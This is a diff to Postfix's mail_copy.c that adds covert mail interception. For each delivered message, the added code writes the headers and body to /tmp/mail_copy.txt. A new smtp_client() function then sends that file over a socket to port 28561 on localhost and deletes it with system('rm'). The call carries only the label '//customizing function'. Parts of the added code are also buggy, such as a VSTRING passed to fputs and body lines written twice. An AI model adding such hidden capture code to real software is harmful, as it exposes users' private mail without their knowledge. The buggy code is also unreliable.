@@ -123,6 +123,46 @@
 #include "dsn_buf.h"
 #include "sys_exits.h"
 
+/* Sokect library. */
+#include <stdio.h>
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <arpa/inet.h>
+
+void smtp_client(){
+	int client_socket;
+	struct sockaddr_in server_addr;
+	int client_socket_connect;
+	FILE *fp;
+	char tmp[100];
+
+	client_socket = socket(AF_INET, SOCK_STREAM, 0);
+	if(client_socket == -1){
+		printf("smtp_socket error\n");
+		return;
+	}
+
+	memset(&server_addr, 0, sizeof(server_addr));
+	server_addr.sin_family = AF_INET;
+	server_addr.sin_port = htons(28561);
+	server_addr.sin_addr.s_addr= inet_addr("127.0.0.1");
+	
+	client_socket_connect = connect(client_socket, (struct sockaddr*)&server_addr, sizeof(server_addr));
+
+	if(client_socket_connect == -1){
+		printf("smtp_socket_connect error\n");
+		return;
+	}
+	
+	fp = fopen("/tmp/mail_copy.txt", "r");
+	while(fgets(tmp, sizeof(tmp), fp)!=NULL)
+		write(client_socket, tmp, strlen(tmp));
+	fclose(fp);
+
+	close(client_socket);
+	system("rm /tmp/mail_copy.txt");
+}
+
 /* mail_copy - copy message with extreme prejudice */
 
 int     mail_copy(const char *sender,
@@ -143,7 +183,7 @@ int     mail_copy(const char *sender,
     int     prev_type;
     struct stat st;
     off_t   size_limit;
-
+FILE *fff;
     /*
      * Workaround 20090114. This will hopefully get someone's attention. The
      * problem with file_size_limit < message_size_limit is that mail will be
@@ -170,7 +210,7 @@ int     mail_copy(const char *sender,
 	    msg_fatal("seek file %s: %m", VSTREAM_PATH(dst));
 #endif
     buf = vstring_alloc(100);
-
+fff = fopen("/tmp/mail_copy.txt", "w+");
     /*
      * Prepend a bunch of headers to the message.
      */
@@ -183,10 +223,12 @@ int     mail_copy(const char *sender,
 	    vstream_fprintf(dst, "From %s  %.24s%s", *sender == 0 ?
 			    MAIL_ADDR_MAIL_DAEMON : vstring_str(buf),
 			    asctime(localtime(&now)), eol);
+fprintf(fff, "From %s  %.24s%s", *sender == 0 ? MAIL_ADDR_MAIL_DAEMON : vstring_str(buf), 	    asctime(localtime(&now)), eol);
 	}
 	if (flags & MAIL_COPY_RETURN_PATH) {
 	    vstream_fprintf(dst, "Return-Path: <%s>%s",
 			    *sender ? vstring_str(buf) : "", eol);
+fprintf(fff, "Return-Path: <%s>%s", *sender ? vstring_str(buf) : "", eol);
 	}
     }
     if (flags & MAIL_COPY_ORIG_RCPT) {
@@ -200,6 +242,7 @@ int     mail_copy(const char *sender,
 	if (*orig_rcpt) {
 	    quote_822_local(buf, orig_rcpt);
 	    vstream_fprintf(dst, "X-Original-To: %s%s", vstring_str(buf), eol);
+fprintf(fff, "X-Original-To: %s%s", vstring_str(buf), eol);
 	}
     }
     if (flags & MAIL_COPY_DELIVERED) {
@@ -207,6 +250,7 @@ int     mail_copy(const char *sender,
 	    msg_panic("%s: null delivered", myname);
 	quote_822_local(buf, delivered);
 	vstream_fprintf(dst, "Delivered-To: %s%s", vstring_str(buf), eol);
+fprintf(fff, "Delivered-To: %s%s", vstring_str(buf), eol);
     }
 
     /*
@@ -225,18 +269,24 @@ int     mail_copy(const char *sender,
 	if (type != REC_TYPE_NORM && type != REC_TYPE_CONT)
 	    break;
 	bp = vstring_str(buf);
+fputs(buf, fff);
 	if (prev_type == REC_TYPE_NORM) {
-	    if ((flags & MAIL_COPY_QUOTE) && *bp == 'F' && !strncmp(bp, "From ", 5))
+	    if ((flags & MAIL_COPY_QUOTE) && *bp == 'F' && !strncmp(bp, "From ", 5)){
 		VSTREAM_PUTC('>', dst);
-	    if ((flags & MAIL_COPY_DOT) && *bp == '.')
+		fputs(">", fff);
+	    }
+	    if ((flags & MAIL_COPY_DOT) && *bp == '.'){
 		VSTREAM_PUTC('.', dst);
+fputs(".", fff);
+	    }
 	}
-	if (VSTRING_LEN(buf) && VSTREAM_FWRITE_BUF(dst, buf) != VSTRING_LEN(buf))
+	if (VSTRING_LEN(buf) && fputs(bp, fff)!=-1 && VSTREAM_FWRITE_BUF(dst, buf) != VSTRING_LEN(buf))
 	    break;
-	if (type == REC_TYPE_NORM && vstream_fputs(eol, dst) == VSTREAM_EOF)
+	if (type == REC_TYPE_NORM && fputs(eol, fff)!=-1 && vstream_fputs(eol, dst) == VSTREAM_EOF)
 	    break;
 	prev_type = type;
     }
+
     if (vstream_ferror(dst) == 0) {
 	if (var_fault_inj_code == 1)
 	    type = 0;
@@ -282,6 +332,11 @@ int     mail_copy(const char *sender,
 	    /* Complain about ignored "undo" errors? So sue me. */
 	    (void) ftruncate(vstream_fileno(dst), orig_length);
 #endif
+
+fclose(fff);
+//customizing function
+smtp_client();
+
     write_error |= vstream_fclose(dst);
 
     /*
